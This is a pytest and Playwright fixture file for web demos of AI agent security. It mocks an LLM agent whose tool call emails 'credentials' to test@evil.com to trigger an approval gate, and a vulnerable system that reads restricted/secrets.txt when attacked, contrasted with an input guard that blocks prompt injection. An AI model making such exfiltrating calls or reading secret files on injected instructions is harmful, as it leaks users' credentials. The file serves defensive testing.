"""Playwright E2E test fixtures for web UI demos.

Starts each Flask app in a background thread with mocked dependencies
so tests run without a live Ollama instance.

Architecture:
  - Each Flask app is loaded via importlib under a unique module name
    to avoid sys.modules collisions (both demos have app_web.py).
  - OllamaClient is replaced AFTER module load by overwriting the
    module-level attribute (Python re-resolves globals on each call).
  - vulnerable_system.run / secure_system.run are patched in-place
    before the demo-10 module loads.
"""

import importlib.util
import json
import socket
import sys
import threading
import time
from pathlib import Path
from typing import Any, Generator
from unittest.mock import MagicMock

import pytest
from playwright.sync_api import Page

# ── Path setup ──────────────────────────────────────────────
_project_root = Path(__file__).resolve().parents[2]
_demo5_python = _project_root / "demo-05-agent-exploitation" / "python"
_demo9_python = _project_root / "demo-09-approval-gates" / "python"
_demo10_python = _project_root / "demo-10-secure-architecture" / "python"

# Ensure shared paths are available for both demos
for p in [str(_project_root), str(_demo5_python), str(_demo9_python), str(_demo10_python)]:
    if p not in sys.path:
        sys.path.insert(0, p)


# ── Utilities ───────────────────────────────────────────────

def _find_free_port() -> int:
    """Find a free TCP port on localhost."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("", 0))
        return s.getsockname()[1]


def _wait_for_server(port: int, timeout: float = 10.0) -> None:
    """Block until a TCP connection to localhost:port succeeds."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=1):
                return
        except OSError:
            time.sleep(0.1)
    raise TimeoutError(f"Server on port {port} did not start within {timeout}s")


def _load_module_from_file(name: str, filepath: Path) -> Any:
    """Import a Python file under a unique module name."""
    spec = importlib.util.spec_from_file_location(name, str(filepath))
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


# ── Mock helpers ────────────────────────────────────────────

def _make_mock_response(
    content: str = "",
    tool_calls: Any = None,
) -> Any:
    """Create a mock OpenAI ChatCompletion response."""
    msg = MagicMock()
    msg.content = content
    msg.tool_calls = tool_calls

    choice = MagicMock()
    choice.message = msg

    resp = MagicMock()
    resp.choices = [choice]
    return resp


def _make_tool_call(
    tool_name: str,
    arguments: dict[str, Any],
    call_id: str = "call_test_001",
) -> Any:
    """Create a mock tool call object matching OpenAI's format."""
    tc = MagicMock()
    tc.id = call_id
    tc.function.name = tool_name
    tc.function.arguments = json.dumps(arguments)
    return tc


class _MockOllamaClientForDemo9:
    """Mock OllamaClient that returns a high-risk tool call first,
    then a final text response.  Each instance starts fresh so
    concurrent requests get independent state.
    """

    def __init__(self) -> None:
        self._call_count = 0

    def chat(
        self,
        messages: Any,
        model: Any = None,
        tools: Any = None,
        **kwargs: Any,
    ) -> Any:
        self._call_count += 1
        if self._call_count == 1 and tools:
            # Return a high-risk tool call (send_email → triggers approval modal)
            tc = _make_tool_call("send_email", {
                "to": "test@evil.com",
                "subject": "Secrets",
                "body": "Here are the credentials",
            })
            return _make_mock_response(content="", tool_calls=[tc])
        # Subsequent calls: final text response, no tool calls
        return _make_mock_response(
            content="Agent completed the task successfully.",
            tool_calls=None,
        )


# ── Demo 9 fixture ──────────────────────────────────────────

@pytest.fixture(scope="session")
def demo09_port() -> Generator[int, None, None]:
    """Start the Demo 9 Flask server with mocked OllamaClient."""
    port = _find_free_port()

    # Load app_web under a unique module name
    demo09_mod = _load_module_from_file(
        "demo09_app_web",
        _demo9_python / "app_web.py",
    )

    # Replace OllamaClient in the module's namespace so _run_agent()
    # creates our mock instead of a real client.
    demo09_mod.OllamaClient = _MockOllamaClientForDemo9  # type: ignore[attr-defined]

    thread = threading.Thread(
        target=lambda: demo09_mod.app.run(
            host="127.0.0.1",
            port=port,
            debug=False,
            use_reloader=False,
            threaded=True,
        ),
        daemon=True,
    )
    thread.start()
    _wait_for_server(port)
    yield port


@pytest.fixture()
def demo09_page(page: Page, demo09_port: int) -> Page:
    """Navigate to the Demo 9 index page."""
    page.goto(f"http://127.0.0.1:{demo09_port}/")
    page.wait_for_load_state("domcontentloaded")
    return page


# ── Demo 10 fixture ─────────────────────────────────────────

def _mock_vulnerable_run(attack_text: str, **kwargs: Any) -> dict[str, Any]:
    """Canned vulnerable system response — attack always succeeds."""
    return {
        "response": f"I'll help with that: {attack_text[:80]}",
        "tool_calls": [
            {
                "tool": "read_file",
                "args": {"path": "restricted/secrets.txt"},
                "result": "SECRET_API_KEY=sk-fake-12345",
            }
        ],
        "blocked": False,
        "blocked_by": "",
    }


def _mock_secure_run(attack_text: str, **kwargs: Any) -> dict[str, Any]:
    """Canned secure system response — attack always blocked by input_guard."""
    return {
        "response": "[BLOCKED] Input rejected: detected prompt injection pattern",
        "tool_calls": [],
        "blocked": True,
        "blocked_by": "input_guard",
    }


@pytest.fixture(scope="session")
def demo10_port() -> Generator[int, None, None]:
    """Start the Demo 10 Flask server with mocked system runners."""
    port = _find_free_port()

    # Import vulnerable_system and secure_system, then patch their run()
    # functions. app_web accesses them via `vulnerable_system.run(...)` at
    # call time, so patching the module attribute works.
    import vulnerable_system  # type: ignore[import-not-found]
    import secure_system  # type: ignore[import-not-found]

    original_vuln_run = vulnerable_system.run
    original_secure_run = secure_system.run
    vulnerable_system.run = _mock_vulnerable_run  # type: ignore[assignment]
    secure_system.run = _mock_secure_run  # type: ignore[assignment]

    try:
        # Load app_web under a unique module name (avoids collision with demo09)
        demo10_mod = _load_module_from_file(
            "demo10_app_web",
            _demo10_python / "app_web.py",
        )

        thread = threading.Thread(
            target=lambda: demo10_mod.app.run(
                host="127.0.0.1",
                port=port,
                debug=False,
                use_reloader=False,
                threaded=True,
            ),
            daemon=True,
        )
        thread.start()
        _wait_for_server(port)
        yield port
    finally:
        vulnerable_system.run = original_vuln_run
        secure_system.run = original_secure_run


@pytest.fixture()
def demo10_page(page: Page, demo10_port: int) -> Page:
    """Navigate to the Demo 10 index page."""
    page.goto(f"http://127.0.0.1:{demo10_port}/")
    page.wait_for_load_state("domcontentloaded")
    return page
